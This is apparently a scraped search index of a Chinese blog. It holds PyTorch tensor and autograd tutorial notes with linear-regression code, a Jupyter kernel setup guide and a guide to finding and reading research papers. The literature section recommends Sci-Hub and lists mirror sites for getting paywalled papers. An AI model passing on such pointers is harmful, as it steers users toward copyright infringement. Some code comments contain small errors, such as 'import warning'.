","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:3:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"查看Tensor的维度 tensor.shape tensor.size() 与上面等价 tensor.dim() 查看维度，等价于 len(tensor.shape),对应Numpy的array.ndim tensor.numel() 查看元素数量，等价于tensor.shape[0]*tensor.shape[1]…或者np.prod(tensor.shape)，对应Numpy中的array.size ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:3:1","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"改变维度： reshape() 会自动先把内存中不连续的Tensor变成连续的，然后进行形状变化等价于tensor.contiguous().view(new_shape) view() 仅能处理空间中连续的Tensor，经过view之后的Tensor仍共享存储区 如果原Tensor在空间上不连续，会报错 用view()来改变Tensor的形状： y = x.view(15) z = x.view(-1, 5) # -1所指的维度可以根据其他维度的值推出来 print(x.size(), y.size(), z.size()) # 输出：torch.Size([5, 3]) torch.Size([15]) torch.Size([3, 5]) 注意view()返回的新Tensor与源Tensor虽然可能有不同的size，但是是共享data的，也即更改其中的一个，另外一个也会跟着改变。(顾名思义，view仅仅是改变了对这个张量的观察角度，内部数据并未改变) reshape()此函数并不能保证返回的是其拷贝。推荐先用clone创造一个副本然后再使用view x_cp = x.clone().view(15) x -= 1 print(x) print(x_cp) # 使用clone还有一个好处是会被记录在计算图中，即梯度回传到副本时也会传到源Tensor。 常用快捷变形方法： tensor.view(dim1, -1, dim2) 指定其中一个维度为-1，pytorchhi自动计算对应形状 tensor.view_as(other) 把形状变得跟另一个一样，等价于tensor.view(other.shape) tensor.squeeze() 将tensor中尺寸为1的维度减掉。例如：形状(1,3,1,4)会变为(3,4) tensor.flatten(start_dim=0, end_dim=-1) 将tensor形状中的某些连续的维度合并为一个维度。例如，(2,3,4,5)会变为(2,12,5) tensor[None]和tensor.unsqueeze(dim):为tensor新建一个维度，该维度尺寸为1 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:3:2","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"Tensor的转置 transpose: 只能用于两个维度的转置 permute：可以对任意高纬度矩阵进行转置 tensor.t() tensor.T 转置会使得tensor在空间上不连续，此时最好通过tensor.contiguous()将其变成连续的 # C * H * W img1 = torch.randn(3,128,256) img2 = img1.permute(1,2,0) # 代表 H,W,C的索引来进行转置 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:3:3","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"9.其他操作 常用的线性代数基本操作 此外，在torch.distributions中还提供了可自定义参数的概率分布函数和采样函数。 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:3:4","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"Tensor与Numpy相互转换 我们很容易用numpy()和from_numpy()将Tensor和NumPy中的数组相互转换。但是需要注意的一点是： 这两个函数所产生的的Tensor和NumPy中的数组共享相同的内存（所以他们之间的转换很快），改变其中一个时另一个也会改变！！ torch.tensor()会进行数据拷贝，但会消耗更多时间和空间 Tensor转Numpy：numpy a = torch.ones(5) b = a.numpy() print(a, b) a += 1 print(a, b) b += 1 print(a, b) Numpy转Tensor：from_numpy import numpy as np a = np.ones(5, dtype=np.float32) b = torch.from_numpy(a) # dtype为float32，所以共享内存(修改b的值a也会变) print(a, b) a += 1 print(a, b) b += 1 print(a, b) 注意1: 使用torch.Tensor()创建的张量默认是float32，如果numpy的数据类型与默认的不一致，那么数据仅仅会被复制，不会共享内存 注意2: 无论输入什么类型，torch.tensor()都只进行数据复制，不会共享内存，要注意 a_tensor = torch.tensor(a) a_tensor[0,1] = 111 a_tensor # a和s_tendor不共享内存 PyTorch还提供了torch.utils.dlpack模块，仍是共享内存的 所有在CPU上的Tensor（除了CharTensor）都支持与NumPy数组相互转换。 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:4:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"命名张量 允许用户将显式名称与Tensor的维度关联起来，便于其他操作，推荐使用维度代名词进行维度操作。 import warning warning.filter(\"ignore\") imgs = torch.randn(1,2,2,3, names=('N', 'C', 'H', 'W')) imgs.names # 输出 ('N', 'C', 'H', 'W') # 旋转 imgs_rotate = imgs.transpose(2,3) imgs_rotate.names # 修改部分维度的名称 rename(H='Height') # 对未命名的张量命名，不需要的用None表示 refine_names('N','W',None,'C') # 通过维度的名词进行维度变换 align_to() 命名张量可以提高安全性，如果两个张量维度相同但是Tensor的维度名称没有对齐，那么也无法进行计算 imgs = torch.randn(1,2,2,3, names=('N', 'C', 'H', 'W')) imgs2 = torch.randn(1,2,2,3, names=('C', 'N', 'W', 'H')) # img2 + imgs2 会报错 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:5:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"Tensor的基本结构 分为： 信息区(Tensor): 头信息区主要保存size、Stride、数据类型等 存储区(Storeage):真正的数据被保存册亨连续数组 绝大多数操作不是修改Tensor的存储区，而是修改Tensor的头信息(更节省内存，提升了速度)。此外，有些操作会导致Tensor不联系，这需要调用tensor.contiguous()变成连续的数据，该方法会复制数据到新内存，不再与原来的数据共享存储区。 ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:6:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"使用Torch从零实现线性回归 \"\"\" 不使用深度学习框架的技术，只使用Torch从零实现线性回归 \"\"\" import torch import torch as t import matplotlib.pyplot as plt device = t.device('cpu') # 如果使用GPU就修改 # 设置随机种子，保证在不同机器上运行时输出一致 t.manual_seed(2022) def get_fake_dta(batch_size=8): ''' 产生随机数据：y=2x+3,加上一些噪声 :param batch_size: :return: x, y ''' # 均值为batch_size，方差为1 x = t.rand(batch_size, 1, device=device) * 5 y = x*2+3 + t.rand(batch_size, 1, device=device) return x, y # 随机初始化参数 w = t.rand(1, 1).to(device) b = t.rand(1, 1).to(device) lr = 0.02 # 学习率 for ii in range(500): x, y = get_fake_dta(batch_size=4) # 前向传播 y_pred = x.mm(w) + b.expand_as(y) # expand_as用到了广播机制 loss = 0.5 * (y_pred -y) ** 2 # 均方误差 loss = loss.mean() # 反向传播： 手动计算梯度 dloss = 1 dy_pred = dloss * (y_pred-y) # dw = x.t().mm(dy_pred) # 梯度 db = dy_pred.sum() # 更新参数 w.sub_(lr * dw) b.sub_(lr * db) if ii % 50 == 0: # 画图 x = t.arange(0,6).float().view(-1,1) y = x.mm(w)+b.expand_as(x) plt.plot(x.numpy(), y.numpy()) x2, y2 = get_fake_dta(batch_size=32) plt.scatter(x2.numpy(), y2.numpy()) plt.xlim(0, 5) plt.ylim(0, 13) plt.show() plt.pause(0.5) print(f\"w:{w.item():.3f}, b:{b.item():.3f}\") 可以看到还是稍微复杂的… autograd autograd自动求导，能够根据输入和前向传播过程自动构建计算图，执行反向传播。 只需要对Tensor增加requires_grad=True属性 几个简单例子： a = torch.randn(3,4, requires_grad=True) a.requires_grad # True b = torch.randn(3,4, requires_grad=True) c = (a + b).sum() # c的requires_grad也被设置成了True c.backward() c # tensor(4.4589, grad_fn=\u003cSumBackward0\u003e) a.grad # 梯度 c.grad_fn # 查看这个Tensor的反向传播函数：\u003cSumBackward0 at 0x142081550\u003e 这里是sum的，所以是这个函数名 c.grad_fn.next_functions # 保存了frad_fn的输入(tuple) ## 叶子节点(is_leaf=True) #requires_grad为False的时候就是叶子Tensor #requires_grad为True，且是由用户创建的时候也是叶子Tensor，她的梯度信息会被保留下来 a.is_leaf # True autograd沿着计算图从根几点溯源，利用链式法则计算所有叶子节点的梯度。每个前向传播操作的函数都有阈值对应的反向传播函数来计算输入Tensor的梯度，这些函数的名字通常以Backward结尾 反向传播过程中，非叶子节点的梯度不会被保存，如果想查看这些变量的梯度，有两种办法： 使用autograd.grad函数 使用hook方法（推荐使用） 其他： 由用户创建的节点叫做叶子节点，叶子节点的grad_fn为None。对于在叶子节点中需要求导的tensor，因为其梯度是累加的，所以剧透AccumulateGrad标识 Tensor默认不需要求导，如果一个节点的requires_grad被设置为True，那么所有依赖他的节点也是True 多次反向传播过程中，梯度是不断累加的。多次反向传播，需要指定retain_graph=True来保存中间缓存 反向传播中，非叶子节点的梯度不会被保存，可以使用autograd.grad或hook来获取 Tensor的grad与data形状一致，应该避免直接修改tensor.data ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:7:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["AI"],"content":"使用autograd从零实现线性回归 \"\"\" 加上autograd从零实现线性回归 \"\"\" import torch import torch as t import matplotlib.pyplot as plt import numpy as np device = t.device('cpu') # 如果使用GPU就修改 # 设置随机种子，保证在不同机器上运行时输出一致 t.manual_seed(2022) def get_fake_dta(batch_size=8): ''' 产生随机数据：y=2x+3,加上一些噪声 :param batch_size: :return: x, y ''' # 均值为batch_size，方差为1 x = t.rand(batch_size, 1, device=device) * 5 y = x*2+3 + t.rand(batch_size, 1, device=device) return x, y # 随机初始化参数 w = t.rand(1, 1, requires_grad=True) b = t.rand(1, 1, requires_grad=True) lr = 0.03 # 学习率 losses = np.zeros(500) for ii in range(500): x, y = get_fake_dta(batch_size=4) # 前向传播:计算loss y_pred = x.mm(w) + b.expand_as(y) # expand_as用到了广播机制 loss = 0.5 * (y_pred -y) ** 2 # 均方误差 loss = loss.sum() losses[ii] = loss.item() # 反向传播: 自动计算梯度 loss.backward() # 更新参数 w.sub_(lr * w.grad.data) b.sub_(lr * b.grad.data) # 梯度清零 w.grad.data.zero_() b.grad.data.zero_() if ii % 50 == 0: # 画图 x = t.arange(0,6).float().view(-1,1) y = x.mm(w)+b.expand_as(x) plt.plot(x.numpy(), y.numpy()) x2, y2 = get_fake_dta(batch_size=32) plt.scatter(x2.numpy(), y2.numpy()) plt.xlim(0, 5) plt.ylim(0, 13) plt.show() plt.pause(0.5) print(f\"w:{w.item():.3f}, b:{b.item():.3f}\") 稍微简单一些了…… ","date":"2022-09-05","objectID":"/pytorch%E5%AD%A6%E4%B9%A0-torch/:8:0","tags":["深度学习","Pytorch","张量系统"],"title":"Pytorch学习-Torch与autograd","uri":"/pytorch%E5%AD%A6%E4%B9%A0-torch/"},{"categories":["Python"],"content":" 1.激活指定虚拟环境 conda activate dlenv 2.安装ipykerbel conda install ipykernel 3.向ipykernel注入指定虚拟环境 # python -m ipykernel install --user --name \"要注入的虚拟环境\"--display-name \"显示名称\" python -m ipykernel install --user --name dlenv --display-name \"dlenv\" 4.打开jupyter notebook，即可选择刚加入的虚拟环境了 ","date":"2022-09-03","objectID":"/anaconda%E4%B8%ADjupyter-notebook%E6%9B%B4%E6%94%B9%E8%A7%A3%E9%87%8A%E5%99%A8/:0:0","tags":null,"title":"Anaconda中jupyter notebook更改解释器","uri":"/anaconda%E4%B8%ADjupyter-notebook%E6%9B%B4%E6%94%B9%E8%A7%A3%E9%87%8A%E5%99%A8/"},{"categories":["科研"],"content":" 本文来自我在B站和网上的一些博客寻找的方法并自己简单进行整理，仅做学习分享，有的忘记了出处所以没有标注出处，如果原作者看到可以联系 如果后面学到什么新的方法或者发现文章不合适的地方，我会及时持续更新本文…. ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:0:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"一些前置知识 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"SCI 科学引文索引（Science Citation Index, SCI）是1961年由美国科学信息研究所（Institute for Scientific Information, ISI）创办的论文检索工具。 高等院校、科研机构、研究者发表的SCI论文总量及被引次数，基本可以反映其学术水平和学术影响力。 SCI收录的论文主要是自然科学的基础研究领域，内容主要涉及数、理、化、农、林、医、生物等基础科学研究领域。 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:1","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"SSCI 社会科学引文索引（Social Sciences Citation Index, SSCI）是一种跨学科的学术引用论文索引，关注社会科学论文资料，了解目前社会科学领域中最有影响力的研究成果。 目前它包含世界上主流的社会科学学术期刊，共有2474种期刊，并且横跨约50种的学科。 SSCI收录的论文涉及人类学、考古学、商业与金融、经济学、教育学、地理学、法律、语言学、政治学、精神病学、心理学、伦理学、公共管理、社会学、女性研究等。 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:2","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"CSSCI 中文社会科学引文索引（Chinese Social Sciences Citation Index）是由南京大学中国社会科学研究评价中心开发研制的数据库，用来检索中文社会科学领域的论文收录和论文被引用情况，是我国人文社会科学评价领域的标志性工程，且教育部已将CSSCI数据作为全国高校机构与基地评估、成果评奖、项目立项、人才培养等方面的重要考核指标，收录包括法学、管理学、经济学、历史学、政治学等在内的25大类的500多种学术期刊。 Note：SCI的权威性是世界级的，更注重基础研究领域；而CSSCI在中国领域具有权威性，更注重社会科学领域的研究。 我国国内的核心主要有三个： 即某领域的期刊中水平较高的刊物。一般各大高校主要看三个核心： 中国科学引文数据库(CSCD)：分为核心库和扩展库两部分，收入我国数学、物理、化学、天文学、地学、生物学、农林科学、医药卫生、工程技术、环境科学和管理科学等领域出版的中英文科技核心期刊和优秀期刊近千种。 中文社会科学引文索引(CSSCI)： 中文核心期刊(北大核心)：由北京多所高校图书馆及中国科学院国家科学图书馆、中国社会科学院论文信息中心等相关单位的百余名专家和期刊工作者参加研究。 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:3","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"影响因子(IF) IF（Impact Factor）是评价期刊影响力的重要指标之一一般来说，IF越高，期刊的学术影响力和学术水平越高，常用于评价同一研究领域不同期刊的相对影响力。。 计算方式为期刊在前两年发表的论文在该年的总被引次数除以该期刊在前两年发表的论文总数。 即: $2021年该期刊的IF =（该期刊20192020年发表的论文在2021年的总被引次数）÷（该期刊在20192020年发表的论文总数）$。 影响因子查询网站： letPub: https://www.letpub.com.cn/index.php?page=journalapp Justscience MedReading ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:4","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"分区 分区（Quartile）是指将期刊按学术影响力和所属领域分类的一种方式，目前主流的分区方法为：JCR分区表与中国科学院分区表。 JCR分区表: JCR分区表由Thomson Reuters出台，先将SCI期刊按照所属领域分为177个学科，再将同一学科所有期刊按照该年的IF降序排列，分为Q1（1%~25%），Q2（26%~50%），Q3（51%~75%），Q4（76%~100%） 中国科学院分区表: 各个高校基本按照中科院分区 中国科学院分区表是根据该SCI期刊的三年平均IF，先将SCI期刊按照所属领域分为14个大类和174个小类，再将同一学科所有期刊按照该年的IF降序排列，分为一区（1%~5%），二区（6%~20%），三区（21%~50%），四区（51%~100%）。三区和四区就比较水了。 分区查询网站： LetPub 微信公众号：中科院文献情报中心分区表 https://www.medreading.cn/pubmed_zh?t=1660117584009 感觉医学的更多呢，也能查看影响因子 https://sci.justscience.cn/ ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:5","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"DOI DOI是数字对象标识(Digital Object Identifier)的简称，是一个专门用来标识数字化对象的命名系统，为数字对象提供唯一、持久的标识符。DOI被形象地称为数字资源的条形码或身份证。无论在任何地方，用户都可以固定的、永久的链接到DOI的相应内容。 中文论文： 首选：ChinaDOI网站（http://www.chinadoi.cn/portal/index.htm），这是亚洲唯一的DOI注册机构网站，中文论文都经此注册。 另外，也可到万方数据知识服务平台 （http://www.wanfangdata.com.cn）查询，ChinaDOI的DOI数据与万方数据知识服务平台同步，在这里查询也一样 还有一种比较简单的查询网址就是百度学术 英文论文： 首选：CrossRef（http://www.crossref.org），这是全球最大的DOI注册机构; 如果在CrossRef找不到，考虑其他注册机构网站，详见 https://dx.doi.org DOI的组成： 编码方案：DOI号由前缀和后缀两部分组成，中间用“/”分隔。DOI前缀由“10.”开头，后面跟着4位数字；DOI后缀不限制长度和字符形式，一般由字母、数字或符号组成。真正的DOI必须符合上述编码规范。 前缀组成 DOI前缀由两部分组成，目录代码和登记机构代码，任何想登记DOI 的组织或单位都可以向IDF申请登记机构代码。 后缀构成 DOI后缀是一个在特定前缀下唯一的后缀，由登记机构分配并确保其唯一性。后缀可以是任何字母数字码，其编码方案完全由登记机构自己来规定。 例如: doi:10.1016/j.acra.2006.06.04（前缀/后缀） 前缀： 10.：DOI在解析系统中的应用代号,是固定的 1016（4位数字）：由IDF的注册机构（RA）统一分配给DOI注册者的 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:1:6","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献的搜索与下载 中文的话：CNKI 英文的话：Wed Of Science 但是，上面两者都是收费的啊，CNKI还好学校有买，但是英文文献(也推荐阅读质量高的英文文献)的查找与下载怎么下载呢？ 推荐方法： 1.前提是知道文献的名字 or DOI 通过 PubMed 或 Web of Science检索，可以比较方便地找到较常使用的文献 DOI 或 PMID 号 2.然后去SCI-Hub或其镜像站下载即可(可能没有最新的),通过DOI、PMID 或 URL搜索，比如下面有网站及镜像站列表： https://www.sci-hub.wf/ https://tool.yovisun.com/scihub https://sci.hubg.org/ 或者其他网站： https://dl.acm.org/ https://dx.doi.org/ https://www.semanticscholar.org/ https://arxiv.org/ 重点关注（计算机/物理/天文/数学等学科的预印本网站）：根据不同领域看看最新的研究进展，也可以对作者、标题等进行搜素 谷歌学术 学术热点查看： https://elib.cnki.net/grid2008/brief/result.aspx?DbPrefix=hotspotcomp\u0026showTitle=%u5B66%u79D1%u5B66%u672F%u70ED%u70B9 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:2:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献的阅读方法\u0026笔记 英文的写作也要重视！！！要通过阅读，去模仿 建议读顶刊，你阅读的期刊决定你发文章的上限！！！ ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:3:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"缩小范围筛选文献 按照下图查看到摘要是否相关: 筛选工具推荐： Stork文献鸟（通过输入研究方向关键词，设定提醒时间，会定时将符合关键词的文献发送邮箱） Connected Pater（通过输入文献名或doi，可获得与文献相关的论文只是图谱，追踪文献的引用和被引关系） –\u003e 类似citespace 和VOS ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:3:1","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献的阅读 常规文献阅读顺序(因人而异)： 1.了解文章整体架构 1.1 读摘要：了解研究背景、论文主要目的、论文主要结论、研究意义 1.2 阅读前言：研究背景简介、现有研究不足、本论文创新点 1.3 材料和方法：试验材料、试验步骤、分析方法 1.4 结果与讨论：试验现象与机理、他人研究对比、不足与未来展望 1.5 结论：凝练总结本论文主要试验现象和相关机理 有选择的阅读方法 针对不同目的，选择不同的阅读方法 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:3:2","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献笔记 记笔记原因： 如何做： 可以做成文献阅读卡！！！ ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:3:3","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献的管理 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:4:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"文献管理软件 网上看了很多，也就是那么几种，个人感觉还不错的有： endnote:https://endnote.com/ 也有中科院版的 Zotero 其他的方法 我目前准备尝试使用沐神推荐的方法，不知道适不适合…,链接如下： https://www.bilibili.com/video/BV1nA41157y4 ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:4:1","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"关于SCI ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:5:0","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"常识 分区 前面已经说了 主流出版社 IEEE ELSEVIER Springer Taylor \u0026 Francis MDPI OA与否 分区与影响因子查询 前面已经说了 其他疑问 英语较差： 英语水平和发SCI没太多关系 步骤： 1.先写出中文 2.使用软件翻译 3.修改与润色 SCI论文与中文期刊论文不同： 字数相对更多、逻辑性相对更强、格式相对更规范 在哪下载外文期刊 前面也说了， 大概有： SCI-Hub, Web of science, 谷歌学术 查看自己论文适合投稿哪些SCI期刊 Find journals： https://journalfinder.elsevier.com/ https://jane.biosemantics.org/ https://journalsuggester.springer.com/ Journal Selector： https://www.edanz.com/journal-selector ","date":"2022-09-02","objectID":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/:5:1","tags":["文献"],"title":"文献学习(简介、搜索、阅读与管理)","uri":"/%E6%96%87%E7%8C%AE%E5%AD%A6%E4%B9%A0-%E7%AE%80%E4%BB%8B%E6%90%9C%E7%B4%A2%E9%98%85%E8%AF%BB%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["科研"],"content":"写作 总体包括： 1.Introduction 引言 这部分的组成： 2.Materials and methods 数据与研究方法 3.Results and analysis 结果与分析 4.Discussion and Conclusions 